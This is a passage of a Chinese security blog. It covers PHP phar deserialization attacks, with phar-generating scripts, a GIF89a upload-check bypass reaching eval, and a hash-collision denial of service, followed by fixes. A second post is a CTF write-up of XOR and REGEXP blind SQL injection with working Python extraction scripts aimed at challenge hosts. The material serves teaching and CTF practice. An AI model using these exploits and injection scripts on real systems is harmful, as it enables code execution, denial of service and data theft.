pgsqlCopyToFile&#x548C;pg_trace&#x540C;&#x6837;&#x4E5F;&#x662F;&#x80FD;&#x4F7F;&#x7528;&#x7684;&#xFF0C;&#x9700;&#x8981;&#x5F00;&#x542F;phar&#x7684;&#x5199;&#x529F;&#x80FD;&#x3002; Mysql LOAD DATA LOCAL INFILE&#x4E5F;&#x4F1A;&#x89E6;&#x53D1;&#x8FD9;&#x4E2A;php_stream_open_wrapper &#x914D;&#x7F6E;&#x4E00;&#x4E0B;mysqld: [mysqld] local-infile=1 secure_file_priv=&quot;&quot; 123456789101112&lt;?phpclass A { public $s = &apos;&apos;; public function __wakeup () { system($this-&gt;s); }}$m = mysqli_init();mysqli_options($m, MYSQLI_OPT_LOCAL_INFILE, true);$s = mysqli_real_connect($m, &apos;localhost&apos;, &apos;root&apos;, &apos;root&apos;, &apos;testtable&apos;, 3306);$p = mysqli_query($m, &apos;LOAD DATA LOCAL INFILE \\&apos;phar://test.phar/test\\&apos; INTO TABLE a LINES TERMINATED BY \\&apos;\\r\\n\\&apos; IGNORE 1 LINES;&apos;);?&gt; &#x6F0F;&#x6D1E;&#x7684;&#x5229;&#x7528;&#x5B9E;&#x4F8B;&#x4E00;&#x4E2A;&#x7B80;&#x5355;&#x7684;&#x4F8B;&#x5B50;phar.php 12345678910111213&lt;?php class TestObject { } $phar = new Phar(&quot;phar.phar&quot;); //&#x540E;&#x7F00;&#x540D;&#x5FC5;&#x987B;&#x4E3A;phar $phar-&gt;startBuffering(); $phar-&gt;setStub(&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;); //&#x8BBE;&#x7F6E;stub $o = new TestObject(); $o -&gt; name=&apos;Threezh1&apos;; //&#x63A7;&#x5236;TestObject&#x4E2D;&#x7684;name&#x53D8;&#x91CF;&#x4E3A;Threezh1 $phar-&gt;setMetadata($o); //&#x5C06;&#x81EA;&#x5B9A;&#x4E49;&#x7684;meta-data&#x5B58;&#x5165;manifest $phar-&gt;addFromString(&quot;test.txt&quot;, &quot;test&quot;); //&#x6DFB;&#x52A0;&#x8981;&#x538B;&#x7F29;&#x7684;&#x6587;&#x4EF6; //&#x7B7E;&#x540D;&#x81EA;&#x52A8;&#x8BA1;&#x7B97; $phar-&gt;stopBuffering();?&gt; index.php 12345678910111213&lt;?phpclass TestObject { public $name; function __destruct() { echo $this -&gt; name; }}if ($_GET[&quot;file&quot;]){ file_exists($_GET[&quot;file&quot;]);}?&gt; &#x4F7F;&#x7528;php phar.php&#x751F;&#x6210;phar.phar&#x6587;&#x4EF6;&#x3002; &#x8BBF;&#x95EE;&#xFF1A;http://127.0.0.1/index.php?file=phar://phar.phar &#x8FD4;&#x56DE;&#xFF1A;Threezh1&#x3002; &#x53CD;&#x5E8F;&#x5217;&#x5316;&#x5229;&#x7528;&#x6210;&#x529F;&#x3002; &#x7ED5;&#x8FC7;&#x6587;&#x4EF6;&#x683C;&#x5F0F;&#x9650;&#x5236; &#x4E0A;&#x4F20;html&#x9875;&#x9762;: upload.html &#x540E;&#x7AEF;&#x6821;&#x9A8C;&#x9875;&#x9762;&#xFF1A;upload.php &#x4E00;&#x4E2A;&#x6F0F;&#x6D1E;&#x9875;&#x9762;&#xFF1A;index.php (&#x5B58;&#x5728;file_exits(), eval()&#x51FD;&#x6570;) &#x4E00;&#x4E2A;&#x4E0A;&#x4F20;&#x76EE;&#x5F55;&#xFF1A; upload_file/ upload.html: 123456789101112&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt; &lt;title&gt;upload file&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;form action=&quot;http://127.0.0.1/upload.php&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot;&gt; &lt;input type=&quot;file&quot; name=&quot;file&quot; /&gt; &lt;input type=&quot;submit&quot; name=&quot;Upload&quot; /&gt;&lt;/form&gt;&lt;/body&gt;&lt;/html&gt; upload.php &#x4EC5;&#x5141;&#x8BB8;&#x683C;&#x5F0F;&#x4E3A;gif&#x7684;&#x6587;&#x4EF6;&#x4E0A;&#x4F20;&#x3002;&#x4E0A;&#x4F20;&#x6210;&#x529F;&#x7684;&#x6587;&#x4EF6;&#x4F1A;&#x5B58;&#x50A8;&#x5230;upload_file&#x76EE;&#x5F55;&#x4E0B;&#x3002; 123456789101112131415161718192021&lt;?phpif (($_FILES[&quot;file&quot;][&quot;type&quot;]==&quot;image/gif&quot;)&amp;&amp;(substr($_FILES[&quot;file&quot;][&quot;name&quot;], strrpos($_FILES[&quot;file&quot;][&quot;name&quot;], &apos;.&apos;)+1))== &apos;gif&apos;) { echo &quot;Upload: &quot; . $_FILES[&quot;file&quot;][&quot;name&quot;]; echo &quot;Type: &quot; . $_FILES[&quot;file&quot;][&quot;type&quot;]; echo &quot;Temp file: &quot; . $_FILES[&quot;file&quot;][&quot;tmp_name&quot;]; if (file_exists(&quot;upload_file/&quot; . $_FILES[&quot;file&quot;][&quot;name&quot;])) { echo $_FILES[&quot;file&quot;][&quot;name&quot;] . &quot; already exists. &quot;; } else { move_uploaded_file($_FILES[&quot;file&quot;][&quot;tmp_name&quot;], &quot;upload_file/&quot; .$_FILES[&quot;file&quot;][&quot;name&quot;]); echo &quot;Stored in: &quot; . &quot;upload_file/&quot; . $_FILES[&quot;file&quot;][&quot;name&quot;]; } }else { echo &quot;Invalid file,you can only upload gif&quot;; } index.php 1234567891011&lt;?phpclass TestObject{ var $data = &apos;echo &quot;Hello World&quot;;&apos;; function __destruct() { eval($this -&gt; data); }}if ($_GET[&quot;file&quot;]){ file_exists($_GET[&quot;file&quot;]);} &#x7ED5;&#x8FC7;&#x601D;&#x8DEF;&#xFF1A;GIF&#x683C;&#x5F0F;&#x9A8C;&#x8BC1;&#x53EF;&#x4EE5;&#x901A;&#x8FC7;&#x5728;&#x6587;&#x4EF6;&#x5934;&#x90E8;&#x6DFB;&#x52A0;GIF89a&#x7ED5;&#x8FC7; &#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x6784;&#x9020;&#x4E00;&#x4E2A;php&#x6765;&#x751F;&#x6210;phar.phar&#x3002; 12345678910111213&lt;?php class TestObject { } $phar = new Phar(&quot;phar.phar&quot;); //&#x540E;&#x7F00;&#x540D;&#x5FC5;&#x987B;&#x4E3A;phar $phar-&gt;startBuffering(); $phar-&gt;setStub(&quot;GIF89a&quot;.&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;); //&#x8BBE;&#x7F6E;stub $o = new TestObject(); $o -&gt; data=&apos;phpinfo();&apos;; //&#x63A7;&#x5236;TestObject&#x4E2D;&#x7684;data&#x4E3A;phpinfo()&#x3002; $phar-&gt;setMetadata($o); //&#x5C06;&#x81EA;&#x5B9A;&#x4E49;&#x7684;meta-data&#x5B58;&#x5165;manifest $phar-&gt;addFromString(&quot;test.txt&quot;, &quot;test&quot;); //&#x6DFB;&#x52A0;&#x8981;&#x538B;&#x7F29;&#x7684;&#x6587;&#x4EF6; //&#x7B7E;&#x540D;&#x81EA;&#x52A8;&#x8BA1;&#x7B97; $phar-&gt;stopBuffering();?&gt; &#x5229;&#x7528;&#x8FC7;&#x7A0B;&#xFF1A; &#x4E00;&#x3001;&#x751F;&#x6210;&#x4E00;&#x4E2A;phar.phar&#xFF0C;&#x4FEE;&#x6539;&#x540E;&#x7F00;&#x540D;&#x4E3A;phar.gif &#x4E8C;&#x3001;&#x4E0A;&#x4F20;&#x5230;upload_file&#x76EE;&#x5F55;&#x4E0B; &#x4E09;&#x3001;&#x8BBF;&#x95EE;&#xFF1A;http://127.0.0.1/index.php?file=upload_file/phar.gif &#x53EF;&#x89C1;&#x5DF2;&#x7ECF;&#x6267;&#x884C;&#x4E86;phpinfo&#x547D;&#x4EE4;&#x4E86;&#x3002; &#x901A;&#x8FC7;&#x4FEE;&#x6539;&#x540E;&#x7F00;&#x540D;&#x548C;&#x6587;&#x4EF6;&#x5934;&#xFF0C;&#x80FD;&#x591F;&#x7ED5;&#x8FC7;&#x5927;&#x90E8;&#x5206;&#x7684;&#x6821;&#x9A8C;&#x3002; &#x914D;&#x5408;PHP&#x5185;&#x6838;&#x54C8;&#x5E0C;&#x8868;&#x78B0;&#x649E;&#x653B;&#x51FB;&#x53C2;&#x8003;&#xFF1A;https://xz.aliyun.com/t/2613 &#x5728;PHP&#x5185;&#x6838;&#x4E2D;&#xFF0C;&#x6570;&#x7EC4;&#x662F;&#x4EE5;&#x54C8;&#x5E0C;&#x8868;&#x7684;&#x65B9;&#x5F0F;&#x5B9E;&#x73B0;&#x7684;&#xFF0C;&#x653B;&#x51FB;&#x8005;&#x53EF;&#x4EE5;&#x901A;&#x8FC7;&#x5DE7;&#x5999;&#x7684;&#x6784;&#x9020;&#x6570;&#x7EC4;&#x5143;&#x7D20;&#x7684;key&#x4F7F;&#x54C8;&#x5E0C;&#x8868;&#x9000;&#x5316;&#x6210;&#x5355;&#x94FE;&#x8868;&#xFF08;&#x65F6;&#x95F4;&#x590D;&#x6742;&#x5EA6;&#x4ECE;O(1) =&gt; O(n)&#xFF09;&#x6765;&#x89E6;&#x53D1;&#x62D2;&#x7EDD;&#x670D;&#x52A1;&#x653B;&#x51FB;(DDOS)&#x3002; &#x4F7F;&#x7528; phar.php &#x751F;&#x6210;&#x6076;&#x610F;&#x7684;phar&#x6587;&#x4EF6;&#xFF1A; 1234567891011121314&lt;?phpset_time_limit(0);$size= pow(2, 16);$array = array();for ($key = 0, $maxKey = ($size - 1) * $size; $key &lt;= $maxKey; $key += $size) { $array[$key] = 0;}$new_obj = new stdClass;$new_obj-&gt;hacker = $array;$p = new Phar(__DIR__ . &apos;/phar.phar&apos;, 0);$p[&apos;hacker.php&apos;] = &apos;&lt;?php ?&gt;&apos;;$p-&gt;setMetadata($new_obj);$p-&gt;setStub(&apos;&lt;?php __HALT_COMPILER();?&gt;&apos;);?&gt; index.php: 1234567&lt;?phpset_time_limit(0);$startTime = microtime(true);file_exists(&quot;phar://phar.phar&quot;);$endTime = microtime(true);echo &apos;Time comsumption: &apos;.($endTime - $startTime). &apos; s&apos;;?&gt; &#x8BBF;&#x95EE;&#xFF1A;http://127.0.0.1/index.php &#x8017;&#x65F6;67&#x79D2; &#x6F0F;&#x6D1E;&#x7684;&#x68C0;&#x6D4B;&#x4E0E;&#x4FEE;&#x590D;&#x68C0;&#x6D4B;&#xFF1A; &#x4F7F;&#x7528;RIPS&#x81EA;&#x52A8;&#x5316;&#x68C0;&#x6D4B; RIPS&#x5BF9;&#x654F;&#x611F;&#x5B57;&#x7B26;&#x4E32;&#x5206;&#x6790;&#x4F7F;&#x6211;&#x4EEC;&#x80FD;&#x591F;&#x7CBE;&#x786E;&#x8BC4;&#x4F30;&#x6587;&#x4EF6;&#x8DEF;&#x5F84;&#x662F;&#x5B8C;&#x5168;&#x8FD8;&#x662F;&#x7531;&#x653B;&#x51FB;&#x8005;&#x63A7;&#x5236;&#xFF0C;&#x4EE5;&#x53CA;&#x662F;&#x5426;&#x53EF;&#x4EE5;phar://&#x6CE8;&#x5165;&#x3002; &#x4FEE;&#x590D;&#xFF1A; &#x5728;&#x6587;&#x4EF6;&#x7CFB;&#x7EDF;&#x51FD;&#x6570;&#x7684;&#x53C2;&#x6570;&#x53EF;&#x63A7;&#x65F6;&#xFF0C;&#x5BF9;&#x53C2;&#x6570;&#x8FDB;&#x884C;&#x4E25;&#x683C;&#x7684;&#x8FC7;&#x6EE4;&#x3002; &#x4E25;&#x683C;&#x68C0;&#x67E5;&#x4E0A;&#x4F20;&#x6587;&#x4EF6;&#x7684;&#x5185;&#x5BB9;&#xFF0C;&#x800C;&#x4E0D;&#x662F;&#x53EA;&#x68C0;&#x67E5;&#x6587;&#x4EF6;&#x5934;&#x3002; &#x5728;&#x6761;&#x4EF6;&#x5141;&#x8BB8;&#x7684;&#x60C5;&#x51B5;&#x4E0B;&#x7981;&#x7528;&#x53EF;&#x6267;&#x884C;&#x7CFB;&#x7EDF;&#x547D;&#x4EE4;&#x3001;&#x4EE3;&#x7801;&#x7684;&#x5371;&#x9669;&#x51FD;&#x6570;&#x3002; &#x53C2;&#x8003; https://paper.seebug.org/680/ https://www.freebuf.com/articles/web/182231.html https://xz.aliyun.com/t/2715 https://xz.aliyun.com/t/2613 https://blog.zsxsoft.com/post/38 https://i.blackhat.com/us-18/Thu-August-9/us-18-Thomas-Its-A-PHP-Unserialization-Vulnerability-Jim-But-Not-As-We-Know-It-wp.pdf","link":"/2019/09/09/phar反序列化/"},{"title":"从CTF题中学习几种有趣(奇怪)的SQL注入","text":"&#x8BF4;&#x5728;&#x524D;&#x9762;&#x6587;&#x7AE0;&#x5DF2;&#x6295;&#x7A3F;&#x81F3;&#x5148;&#x77E5;&#x793E;&#x533A;&#xFF0C;&#x5177;&#x4F53;&#x5185;&#x5BB9;&#xFF1A;&#x4ECE;CTF&#x9898;&#x4E2D;&#x5B66;&#x4E60;&#x51E0;&#x79CD;&#x6709;&#x8DA3;(&#x5947;&#x602A;)&#x7684;SQL&#x6CE8;&#x5165; 1.&#x5F02;&#x6216;&#x6CE8;&#x5165;&#x9898;&#x76EE;&#x5730;&#x5740;&#xFF1A;http://119.23.73.3:5004/ &#x5728;&#x4E00;&#x4E2A;&#x5E08;&#x5085;&#x7684;&#x535A;&#x5BA2;&#x4E2D;&#x770B;&#x5230;&#x8FD9;&#x9898;&#x7684;Writeup&#xFF0C;&#x5C1D;&#x8BD5;&#x6309;&#x7167;&#x4ED6;&#x7684;payload&#x8FDB;&#x884C;&#x590D;&#x73B0;&#xFF0C;&#x600E;&#x4E48;&#x90FD;&#x590D;&#x73B0;&#x4E0D;&#x51FA;&#x6765;&#x3002;&#x540E;&#x6765;&#x5728;&#x5B89;&#x5168;&#x5BA2;&#x4E0A;&#x770B;&#x5230;&#x53E6;&#x4E00;&#x7BC7;&#x5F02;&#x6216;&#x6CE8;&#x5165;&#x7684;&#x6587;&#x7AE0;&#xFF0C;&#x624D;&#x628A;&#x8FD9;&#x4E2A;&#x9898;&#x89E3;&#x51B3;&#x4E86;&#x3002; &#x521D;&#x6B65;&#x6D4B;&#x8BD5;&#x4E4B;&#x540E;&#x4F1A;&#x53D1;&#x73B0;&#xFF0C;&#x9898;&#x76EE;&#x8FC7;&#x6EE4;&#x4E86;&#x7A7A;&#x683C;&#xFF0C;+&#xFF0C;*&#xFF0C;or&#xFF0C;substr&#x2026;&#x7B49;&#x4E00;&#x4E9B;&#x5B57;&#x7B26;&#x3002;&#x800C;&#x4E14;#&#x53F7;&#x6CE8;&#x91CA;&#x4E5F;&#x4E0D;&#x8D77;&#x4F5C;&#x7528;&#x3002; &#x4E8E;&#x662F;&#x5C1D;&#x8BD5;&#x5F02;&#x6216;&#x6CE8;&#x5165;&#x3002; http://119.23.73.3:5004/?id=1&apos;^&apos;1 &#x8FD4;&#x56DE;&#x9519;&#x8BEF; http://119.23.73.3:5004/?id=1&apos;^&apos;0 &#x8FD4;&#x56DE;&#x6B63;&#x5E38; &#x5728;MYSQL&#x547D;&#x4EE4;&#x4E2D;&#xFF1A; &#x53EF;&#x89C1;&#xFF0C;&#x5F53;/?id=1&#x2019;^&#x2019;1&#x65F6;&#xFF0C;&#x4F20;&#x9012;&#x5230;&#x6570;&#x636E;&#x5E93;&#x5F53;&#x4E2D;&#xFF0C;&#x662F;id=0&#xFF0C;&#x7531;&#x4E8E;&#x4E3A;0&#x7684;id&#x4E0D;&#x5B58;&#x5728;&#xFF0C;&#x6240;&#x4EE5;&#x8FD9;&#x91CC;&#x8FD4;&#x56DE;&#x9519;&#x8BEF;&#x3002;&#x7B2C;&#x4E8C;&#x4E2A;&#x540C;&#x7406;&#x3002; &#x8FD9;&#x91CC;&#x5C5E;&#x4E8E;&#x5E03;&#x5C14;&#x76F2;&#x6CE8;&#xFF0C;&#x4E8E;&#x662F;&#x6784;&#x9020;payload&#xFF0C;&#x7528;&#x811A;&#x672C;&#x8DD1;&#xFF1A; &#x68C0;&#x7D22;&#x6570;&#x636E;&#x5E93;&#xFF1A; id=2&apos;^!(SELECT(ASCII(MID((SELECT(GROUP_CONCAT(schema_name))FROM(information_schema.schemata)),1,1))=104))^&apos;1&apos;=&apos;1 &#x68C0;&#x7D22;&#x51FA;&#x6765;&#x7684;&#x5E93;&#x4E3A;&#xFF1A;information_schema,moctf,mysql,performance_schema &#x68C0;&#x7D22;&#x8868;&#xFF1A; id=2&apos;^!(SELECT(ASCII(MID((SELECT(GROUP_CONCAT(table_name))FROM(information_schema.tables)WHERE(table_schema=&apos;moctf&apos;)),1,1))=104))^&apos;1&apos;=&apos;1 &#x68C0;&#x7D22;&#x51FA;&#x6765;&#x7684;&#x8868;&#xFF1A;do_y0u_l1ke_long_t4ble_name,news &#x68C0;&#x7D22;&#x5B57;&#x6BB5;&#xFF1A; id=2&apos;^!(SELECT(ASCII(MID((SELECT(GROUP_CONCAT(column_name))FROM(information_schema.columns)WHERE(table_name=&apos;do_y0u_l1ke_long_t4ble_name&apos;)),1,1))=104))^&apos;1&apos;=&apos;1 &#x68C0;&#x7D22;&#x51FA;&#x6765;&#x7684;&#x5B57;&#x6BB5;&#xFF1A;d0_you_als0_l1ke_very_long_column_name &#x8BFB;Flag&#xFF1A; id=2&apos;^!(SELECT(ASCII(MID((SELECT(GROUP_CONCAT(d0_you_als0_l1ke_very_long_column_name))FROM(moctf.do_y0u_l1ke_long_t4ble_name)),1,1))=104))^&apos;1&apos;=&apos;1 moctfb1ind_SQL_1njecti0n_g0od &#x811A;&#x672C;&#xFF1A; 123456789101112131415161718192021import requests#&#x6587;&#x5B57;&#x8F6C;ascii ord()#ascii&#x8F6C;&#x6587;&#x5B57; ascii()dic = &quot;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_,&quot;url = &quot;http://119.23.73.3:5004/?id=2&apos;^&quot;keyword = &quot;Tip&quot;string = &quot;&quot;for i in range(1, 300): for j in dic: payload = &quot;!(SELECT(ASCII(MID((SELECT(GROUP_CONCAT(schema_name))FROM(information_schema.schemata)),{0},1))={1}))^&apos;1&apos;=&apos;1&quot;.format(str(i),ord(j)) url_get = url + payload print(url_get) content = requests.get(url_get) if keyword in content.text: string += j print(string) breakprint(&quot;result = &quot; + string) &#x8DD1;&#x51FA;&#x6765;&#x7684;Flag&#xFF1A; 2.REGEXP&#x76F2;&#x6CE8;&#x9898;&#x76EE;&#x94FE;&#x63A5;&#xFF1A;http://ctf5.shiyanbar.com/web/earnest/index.php Writeup(&#x8981;&#x767B;&#x5F55;)&#xFF1A;http://www.shiyanbar.com/ctf/writeup/4828 &#x8FD9;&#x9053;&#x9898;&#x6211;&#x672C;&#x6765;&#x662F;&#x4FE1;&#x5FC3;&#x6EE1;&#x6EE1;&#x7684;&#xFF0C;&#x7136;&#x540E;&#x8D8A;&#x505A;&#x8D8A;&#x4E0D;&#x5BF9;&#x52B2;&#x3002;&#x505A;&#x8FD9;&#x9053;&#x9898;&#x7684;&#x65F6;&#x5019;&#x5E76;&#x6CA1;&#x6709;fuzz&#x7684;&#x5B57;&#x6BB5;&#x8FD8;&#x6CA1;&#x6709;&#x9017;&#x53F7;&#xFF0C;&#x83AB;&#x540D;&#x5C31;&#x4F1A;&#x88AB;&#x62E6;&#x622A;&#xFF0C;&#x641E;&#x5F97;&#x4E00;&#x5934;&#x96FE;&#x6C34;&#x3002;&#x6700;&#x540E;&#x8FD8;&#x662F;&#x8DD1;&#x53BB;&#x770B;Writeup&#x4E86;&#x3002; &#x5148;fuzz&#x5355;&#x5B57;&#x7B26;&#x6765;&#x770B;&#x770B;waf&#x3002;&#x8FD8;&#x662F;&#x62E6;&#x622A;&#x4E86;&#x5F88;&#x591A;&#x7684;&#xFF0C;&#x800C;&#x4E14;&#x9017;&#x53F7;&#x548C;&#x7A7A;&#x683C;&#x4E5F;&#x88AB;&#x8FC7;&#x6EE4;&#x4E86;&#x3002; &#x9664;&#x6B64;&#x4E4B;&#x5916;&#xFF0C;&#x88AB;&#x8FC7;&#x6EE4;&#x7684;&#x8FD8;&#x6709;&#xFF1A;is not, union, sleep, substr, benchmark, substring, and&#x3002; &#x5E76;&#x4E14;&#x6839;&#x636E;&#x5927;&#x4F6C;&#x7684;&#x601D;&#x8DEF;&#xFF0C;&#x8FD9;&#x91CC;&#x7684;or&#xFF0C;+&#xFF0C;*&#x4E5F;&#x90FD;&#x4F1A;&#x88AB;&#x66FF;&#x6362;&#x4E3A;&#x7A7A; &#x770B;&#x6765;&#x65F6;&#x95F4;&#x76F2;&#x6CE8;&#x662F;&#x6CA1;&#x620F;&#x4E86;&#x3002;&#x5E76;&#x4E14;&#x8FC7;&#x6EE4;&#x4E86;&#x9017;&#x53F7;&#x3002; &#x6211;&#x4EEC;&#x77E5;&#x9053;&#xFF0C;regexp&#x76F2;&#x6CE8;&#x7684;&#x539F;&#x7406;&#x662F;&#x7528;&#x6B63;&#x5219;&#x8868;&#x8FBE;&#x5F0F;&#x5339;&#x914D;&#x3002; &#x4F8B;&#x5B50;&#xFF1A; &#x6B63;&#x5E38;&#x7684;&#x8BED;&#x53E5;&#x4E3A;&#xFF1A;select username from users where id = 1 &#x6B63;&#x5E38;&#x8FD4;&#x56DE;&#xFF1A;admin &#x6784;&#x9020;&#x8BED;&#x53E5;&#xFF1A; select (select username from users where id = 1) regexp &apos;^a&apos; &#x8FD4;&#x56DE;&#x771F;(1) select (select username from users where id = 1) regexp &apos;^b&apos; &#x8FD4;&#x56DE;&#x5047;(0) &#x56E0;&#x4E3A;&#x8FD9;&#x91CC;&apos;^a&apos;&#x662F;&#x5339;&#x914D;&#x4EE5;a&#x5F00;&#x5934;&#x7684;&#x5B57;&#x7B26;&#x4E32;&#xFF0C;&#x539F;&#x6765;&#x6B63;&#x5E38;&#x8FD4;&#x56DE;&#x7684;&#x5C31;&#x662F;admin&#xFF0C;&#x6240;&#x4EE5;&#x4F1A;&#x8FD4;&#x56DE;&#x771F;&#x3002; &#x7EE7;&#x7EED;&#x5C31;&#x53EF;&#x4EE5;&#x4F7F;&#x7528; regexp &apos;^ad&apos;...&#x8BFB;&#x51FA;&#x60F3;&#x8981;&#x7684;&#x6570;&#x636E; &#x90A3;&#x4E48;&#x8FD9;&#x91CC;&#x8BE5;&#x600E;&#x4E48;&#x6784;&#x9020;&#x5462;&#xFF1F; &#x83B7;&#x53D6;version &#x5148;&#x7528;length&#x6765;&#x5224;&#x65AD;verison&#x7684;&#x957F;&#x5EA6;&#xFF1A; id=11&apos;Or(LENGTH(version())=6)Or&apos;1&apos;=&apos; &#x7531;&#x4E8E;^&#x88AB;&#x8FC7;&#x6EE4;&#x4E86;&#xFF0C;&#x6240;&#x4EE5;&#x7528;$&#x6765;&#x4ECE;&#x5C3E;&#x90E8;&#x5F00;&#x59CB;&#x8BFB;&#x3002; &#x811A;&#x672C;&#xFF1A; 123456789101112131415import requestskey = &quot;You are in&quot;words = &quot;&quot;data = {&quot;id&quot;: &quot;&quot;}word = &apos;0123456789.&apos;for i in range(10): for j in word: data[&apos;id&apos;] = &quot;11&apos;Or(SELECT(version()regexp&apos;{}$&apos;))Or&apos;1&apos;=&apos;&quot;.format(j+words) print(data) content = requests.post(&quot;http://ctf5.shiyanbar.com/web/earnest/index.php&quot;, data = data) if key in content.text: words = str(j) + words print(words) &#x6700;&#x540E;&#x8DD1;&#x51FA;&#x6765;&#x4E3A;&#xFF1A;&#x201C;5.6..4&#x201D; &#x83B7;&#x53D6;&#x6570;&#x636E;&#x5E93;&#x540D; &#x5C06;&#x4E0A;&#x9762;&#x7684;word&#x66FF;&#x6362;&#x4E3A;&#xFF1A;&#x201D;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_,&#x201D;, version()&#x66FF;&#x6362;&#x4E3A;database()&#x5373;&#x53EF;&#x3002; &#x8DD1;&#x51FA;&#x6765;&#x4E3A;&#xFF1A;Ctf_sql_bOol_bLInd &#x83B7;&#x53D6;&#x8868; &#x6CE8;&#x610F;&#x8FD9;&#x91CC;&#x7684;seperator&#x91CC;&#x9762;&#x7684;or&#x8981;&#x53CC;&#x5199;&#x3002; 12345678910111213141516import requestskey = &quot;You are in&quot;words = &quot;&quot;data = {&quot;id&quot;: &quot;&quot;}word = &quot;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!_{}@~.&quot;for i in range(30): for j in word: data[&apos;id&apos;] = &quot;11&apos;Or(SELECT((SELECT(group_concat(table_name\\nseparatoorr\\n&apos;@&apos;))FROM(INFORMATION_SCHEMA.tables)WHERE(TABLE_SCHEMA=database()))regexp&apos;{}$&apos;))Or&apos;1&apos;=&apos;&quot;.format(j+words) print(data) content = requests.post(&quot;http://ctf5.shiyanbar.com/web/earnest/index.php&quot;, data = data) #print(content.text) if key in content.text: words = str(j) + words print(words) &#x8DD1;&#x51FA;&#x6765;&#x7684;&#x8868;&#xFF1A;fIAg@useRs &#x53EF;&#x80FD;&#x662F;&#x811A;&#x672C;&#x7684;&#x539F;&#x56E0;&#xFF0C;&#x6211;&#x8DD1;&#x51FA;&#x6765;&#x7684;&#x8868;&#x662F;&#x6709;&#x5927;&#x5199;&#x6709;&#x5C0F;&#x5199;&#x3002; &#x5E76;&#x4E14;&#x8FD9;&#x91CC;&#x6709;&#x4E2A;&#x5751;&#x5C31;&#x662F;&#x9017;&#x53F7;&#x88AB;&#x8FC7;&#x6EE4;&#x4E86;&#xFF0C;&#x5BFC;&#x81F4;group_concat&#x5FC5;&#x987B;&#x4F7F;&#x7528;separator&#x6307;&#x5B9A;&#x5B57;&#x7B26;&#x6765;&#x5206;&#x5272;&#x3002; &#x83B7;&#x53D6;&#x5B57;&#x6BB5; 12345678910111213141516171819import requestskey = &quot;You are in&quot;words = &quot;&quot;data = {&quot;id&quot;: &quot;&quot;}word = &quot;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!_{}@~.&quot;for i in range(30): for j in word: data[&apos;id&apos;] = &quot;11&apos;Or(SELECT((SELECT(group_concat(column_name\\nseparatoorr\\n&apos;@&apos;))FROM(INFORMATION_SCHEMA.columns)WHERE(table_name=&apos;fiag&apos;))regexp&apos;{}$&apos;))Or&apos;1&apos;=&apos;&quot;.format(j+words) print(data) content = requests.post(&quot;http://ctf5.shiyanbar.com/web/earnest/index.php&quot;, data = data) #print(content.text) if key in content.text: if j == &quot;$&quot;: words = j+ words else: words = j+ words print(words) &#x8FD9;&#x91CC;&#x7684;&#x5751;&#x5B9E;&#x5728;&#x662F;&#x592A;&#x5947;&#x602A;&#x4E86;&#xFF0C;&#x5F53;word&#x91CC;&#x9762;&#x4E0D;&#x52A0;&#x70B9;&#x53F7;&#x65F6;&#xFF0C;&#x8DD1;&#x51FA;&#x6765;&#x53EA;&#x6709;&#xFF1A;4g&#xFF0C;&#x539F;&#x56E0;&#x662F;&#x5B57;&#x6BB5;&#x7684;&#x540D;&#x5B57;&#x4E3A;fl$4g&#xFF0C;&#x91CC;&#x9762;&#x5305;&#x542B;&#x4E00;&#x4E2A;$&#x5BFC;&#x81F4;&#x6B63;&#x5219;&#x5339;&#x914D;&#x9519;&#x8BEF;&#x3002; Writeup&#x539F;&#x4F5C;&#x8005;&#xFF0C;&#x5C06;&#x70B9;&#x53F7;&#x52A0;&#x5230;&#x4E86;word&#x91CC;&#x3002;&#x8DD1;&#x51FA;&#x6765;&#x5C31;&#x4E3A;&#xFF1A;fl..g&#xFF0C;&#x53EF;&#x4EE5;&#x731C;&#x6D4B;&#x5230;&#x5B57;&#x6BB5;&#x540D;&#x4E3A;&#xFF1A;fl$4g (&#x771F;&#x7684;&#x662F;&#x731C;&#x6D4B;) &#x5728;&#x6B63;&#x5219;&#x5F53;&#x4E2D;&#xFF0C;&#x70B9;&#x53F7;&#x662F;&#x7528;&#x6765;&#x5339;&#x914D;&#x4EFB;&#x610F;&#x5B57;&#x7B26;&#x7684;&#xFF0C;&#x8FD9;&#x91CC;&#x7684;$&#x5C31;&#x4F1A;&#x88AB;.&#x66FF;&#x4EE3;&#x3002;&#x8FD9;&#x91CC;&#x6211;&#x771F;&#x7684;&#x88AB;&#x5361;&#x4E86;&#x597D;&#x4E45;&#x3002; &#x83B7;&#x53D6;flag 12345678910111213141516import requestskey = &quot;You are in&quot;words = &quot;&quot;data = {&quot;id&quot;: &quot;&quot;}word = &quot;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!_{}@~.&quot;for i in range(30): for j in word: data[&apos;id&apos;] = &quot;11&apos;Or(SELECT(SELECT(fl$4g)FROM(fiag))regexp&apos;{}$&apos;)Or&apos;1&apos;=&apos;&quot;.format(str(j)+words) print(data) content = requests.post(&quot;http://ctf5.shiyanbar.com/web/earnest/index.php&quot;, data = data) #print(content.text) if key in content.text: words = str(j) + words print(words) &#x6700;&#x540E;&#x8DD1;&#x51FA;&#x6765;&#x7684;&#x7ED3;&#x679C;&#x4E3A;&#xFF1A; Fla.{HAh.~YOu.WIn.} &#x50CF;&#x8DD1;&#x5B57;&#x6BB5;&#x4E00;&#x6837;&#x5C1D;&#x8BD5;&#x4E4B;&#x540E;&#x53EF;&#x4EE5;&#x731C;&#x6D4B;&#x5230;&#xFF1A; &#x6700;&#x540E;&#x7684;flag&#x4E3A;&#xFF1A; flag{haha~you win!} &#x603B;&#x7ED3; 